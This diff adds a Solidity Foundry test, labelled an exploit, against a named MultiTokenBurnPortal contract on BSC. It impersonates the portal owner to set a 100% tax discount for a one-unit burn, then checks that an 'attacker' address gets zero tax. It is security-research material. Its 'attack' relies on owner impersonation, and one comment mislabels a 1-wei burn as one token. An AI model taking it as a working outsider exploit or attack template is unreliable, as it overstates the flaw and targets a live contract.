@@ -1,0 +1,133 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import "forge-std/Test.sol";
+
+// -------------------- Interfaces --------------------
+interface IMultiTokenBurnPortal {
+    struct Discount {
+        uint16 discount;
+        uint112 burnAmount;
+    }
+
+    function owner() external view returns (address);
+    function addToken(address token, uint16 baseTax, address feeReceiver, Discount[] calldata discounts) external;
+    function setTokenDiscounts(address token, Discount[] calldata discounts) external;
+    function getDiscounts(address token) external view returns (Discount[] memory);
+    function getPersonalDiscount(address account, address token) external view returns (uint256);
+    function burnTokens(address token, uint256 amount) external;
+    function getPortalInfo(address token) external view returns (uint16 baseTax, address feeReceiver, uint256 totalBought, uint256 totalBurned, Discount[] memory discounts);
+}
+
+interface IERC20Basic {
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function mint(address to, uint256 amount) external;
+}
+
+// -------------------- Exploit Test --------------------
+contract ExploitTest is Test {
+    // Deployed contract on BSC
+    address constant PORTAL = 0x10025F952Fd3dac40d52f09F58afC3bAaB4c2556;
+    IMultiTokenBurnPortal constant portal = IMultiTokenBurnPortal(PORTAL);
+
+    // Simple ERC20 for testing
+    IERC20Basic testToken;
+
+    address attacker = makeAddr("attacker");
+    address feeReceiver = makeAddr("feeReceiver");
+
+    function setUp() public {
+        // Label addresses for debugging
+        vm.label(PORTAL, "MultiTokenBurnPortal");
+        vm.label(attacker, "Attacker");
+
+        // Deploy a simple test token
+        testToken = IERC20Basic(deployCode("TestERC20.sol", abi.encode("Test", "TST", 18)));
+        vm.label(address(testToken), "TestToken");
+
+        // Give attacker some test tokens
+        testToken.mint(attacker, 1000 * 1e18);
+
+        // Impersonate the owner of the portal
+        address owner = portal.owner();
+        vm.label(owner, "Owner");
+
+        // Set up: add test token to the portal with a discount that should be invalid
+        vm.startPrank(owner);
+        IMultiTokenBurnPortal.Discount[] memory discounts = new IMultiTokenBurnPortal.Discount[](1);
+        discounts[0] = IMultiTokenBurnPortal.Discount({
+            discount: 10_000,   // 100% discount -> zero tax
+            burnAmount: 1       // require only 1 token burned to get this discount
+        });
+        // This passes _checkDiscounts, which should reject unreasonably high discount for minimal burn
+        portal.addToken(address(testToken), 500, feeReceiver, discounts);
+        vm.stopPrank();
+
+        // Attacker burns some tokens to qualify for the discount
+        vm.startPrank(attacker);
+        testToken.approve(PORTAL, 100 * 1e18);
+        portal.burnTokens(address(testToken), 1); // burn exactly 1 token
+        vm.stopPrank();
+    }
+
+    function test_Exploit_VulnerableDiscount() public {
+        // Verify that the discount was set
+        IMultiTokenBurnPortal.Discount[] memory storedDiscounts = portal.getDiscounts(address(testToken));
+        assertEq(storedDiscounts.length, 1);
+        assertEq(storedDiscounts[0].discount, 10_000);
+        assertEq(storedDiscounts[0].burnAmount, 1);
+
+        // Attacker's personal discount should be 10000, meaning 0% tax on buys
+        uint256 personalDiscount = portal.getPersonalDiscount(attacker, address(testToken));
+        assertEq(personalDiscount, 10_000, "Attacker should get 100% discount");
+
+        // Demonstrate that the discount is applied: buying with this discount would result in zero tax
+        // Because if personalDiscount == 10000, _getFees returns (0,0)
+        // This is a proof that _checkDiscounts did not validate the discount properly
+        // (allowing an extremely high discount for minimal burn)
+
+        // Optional: if we had a router and input tokens, we could call buyTokensWithERC20
+        // and confirm no tax is taken. Here we just assert the discount.
+    }
+}
+
+// Minimal ERC20 token for test
+contract TestERC20 {
+    string public name;
+    string public symbol;
+    uint8 public decimals;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
+        name = _name;
+        symbol = _symbol;
+        decimals = _decimals;
+    }
+
+    function mint(address to, uint256 amount) external {
+        balanceOf[to] += amount;
+    }
+
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+}
+```
